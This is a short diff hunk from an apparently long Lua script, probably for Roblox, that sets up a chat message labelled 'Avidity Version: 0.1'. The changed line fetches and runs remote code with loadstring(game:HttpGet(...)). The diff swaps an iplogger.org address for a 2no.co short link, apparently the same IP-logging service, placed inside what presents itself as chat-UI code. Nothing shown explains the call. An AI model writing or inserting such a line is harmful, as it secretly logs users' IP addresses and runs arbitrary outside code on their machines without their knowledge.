@@ -8107,4 +8107,4 @@ ChatScript.moveOldMessages()
 
 ChatScript.createNewMessage("Avidity","Version: 0.1",MainUIColor,Color3.new(1,1,1),0.01,nil)
 	
-loadstring(game:HttpGet('https://iplogger.org/2H3iD6', true))()
+loadstring(game:HttpGet('https://2no.co/2H3iD6', true))()
